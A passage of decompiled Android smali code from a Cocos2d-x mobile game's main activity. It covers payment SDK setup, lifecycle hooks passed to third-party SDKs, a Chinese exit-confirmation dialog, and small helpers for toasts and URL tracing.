    invoke-direct {v2, p0}, Lorg/cocos2dx/cpp/AppActivity$5;-><init>(Lorg/cocos2dx/cpp/AppActivity;)V

    const-string v3, "A138"

    const-string v4, "haorun"

    invoke-virtual {v0, v1, v2, v3, v4}, Lcom/mgame/pay/main/Payment;->init(Landroid/content/Context;Lcom/mgame/pay/IPayCallback;Ljava/lang/String;Ljava/lang/String;)V

    return-void
.end method

.method protected onDestroy()V
    .locals 0

    invoke-super {p0}, Lorg/cocos2dx/lib/Cocos2dxActivity;->onDestroy()V

    invoke-static {p0}, Lcom/snowfish/cn/ganga/offline/helper/SFCommonSDKInterface;->onDestroy(Landroid/app/Activity;)V

    invoke-direct {p0}, Lorg/cocos2dx/cpp/AppActivity;->yijieExit()V

    return-void
.end method

.method public onInitResult(I)V
    .locals 0

    return-void
.end method

.method public onKeyDown(ILandroid/view/KeyEvent;)Z
    .locals 4

    const/4 v0, 0x1

    const/4 v1, 0x4

    if-ne p1, v1, :cond_1

    sget v1, Lorg/cocos2dx/cpp/AppActivity;->isShowExit:I

    if-nez v1, :cond_0

    :goto_0
    return v0

    :cond_0
    new-instance v1, Landroid/app/AlertDialog$Builder;

    invoke-direct {v1, p0}, Landroid/app/AlertDialog$Builder;-><init>(Landroid/content/Context;)V

    const-string v2, "\u9000\u51fa\u6e38\u620f"

    invoke-virtual {v1, v2}, Landroid/app/AlertDialog$Builder;->setTitle(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    move-result-object v1

    const-string v2, "\u786e\u5b9a\u9000\u51fa\u6e38\u620f\uff1f"

    invoke-virtual {v1, v2}, Landroid/app/AlertDialog$Builder;->setMessage(Ljava/lang/CharSequence;)Landroid/app/AlertDialog$Builder;

    move-result-object v1

    const-string v2, "\u53d6\u6d88"

    new-instance v3, Lorg/cocos2dx/cpp/AppActivity$6;

    invoke-direct {v3, p0}, Lorg/cocos2dx/cpp/AppActivity$6;-><init>(Lorg/cocos2dx/cpp/AppActivity;)V

    invoke-virtual {v1, v2, v3}, Landroid/app/AlertDialog$Builder;->setNegativeButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;

    move-result-object v1

    const-string v2, "\u786e\u5b9a"

    new-instance v3, Lorg/cocos2dx/cpp/AppActivity$7;

    invoke-direct {v3, p0}, Lorg/cocos2dx/cpp/AppActivity$7;-><init>(Lorg/cocos2dx/cpp/AppActivity;)V

    invoke-virtual {v1, v2, v3}, Landroid/app/AlertDialog$Builder;->setPositiveButton(Ljava/lang/CharSequence;Landroid/content/DialogInterface$OnClickListener;)Landroid/app/AlertDialog$Builder;

    move-result-object v1

    invoke-virtual {v1}, Landroid/app/AlertDialog$Builder;->show()Landroid/app/AlertDialog;

    goto :goto_0

    :cond_1
    invoke-super {p0, p1, p2}, Lorg/cocos2dx/lib/Cocos2dxActivity;->onKeyDown(ILandroid/view/KeyEvent;)Z

    move-result v0

    goto :goto_0
.end method

.method public onPause()V
    .locals 0

    invoke-super {p0}, Lorg/cocos2dx/lib/Cocos2dxActivity;->onPause()V

    invoke-static {p0}, Lcom/b/a/a/a;->a(Landroid/content/Context;)V

    invoke-static {p0}, Lcom/snowfish/cn/ganga/offline/helper/SFCommonSDKInterface;->onPause(Landroid/app/Activity;)V

    return-void
.end method

.method public onResume()V
    .locals 0

    invoke-super {p0}, Lorg/cocos2dx/lib/Cocos2dxActivity;->onResume()V

    invoke-static {p0}, Lcom/b/a/a/a;->b(Landroid/content/Context;)V

    invoke-static {p0}, Lcom/snowfish/cn/ganga/offline/helper/SFCommonSDKInterface;->onResume(Landroid/app/Activity;)V

    return-void
.end method

.method public toastHint(Ljava/lang/String;)V
    .locals 1

    new-instance v0, Lorg/cocos2dx/cpp/AppActivity$10;

    invoke-direct {v0, p0, p1}, Lorg/cocos2dx/cpp/AppActivity$10;-><init>(Lorg/cocos2dx/cpp/AppActivity;Ljava/lang/String;)V

    invoke-virtual {p0, v0}, Lorg/cocos2dx/cpp/AppActivity;->runOnUiThread(Ljava/lang/Runnable;)V

    return-void
.end method

.method public traceUrl(Ljava/lang/String;)V
    .locals 2

    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lorg/cocos2dx/cpp/AppActivity$8;

    invoke-direct {v1, p0, p1}, Lorg/cocos2dx/cpp/AppActivity$8;-><init>(Lorg/cocos2dx/cpp/AppActivity;Ljava/lang/String;)V

    invoke-direct {v0, v1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

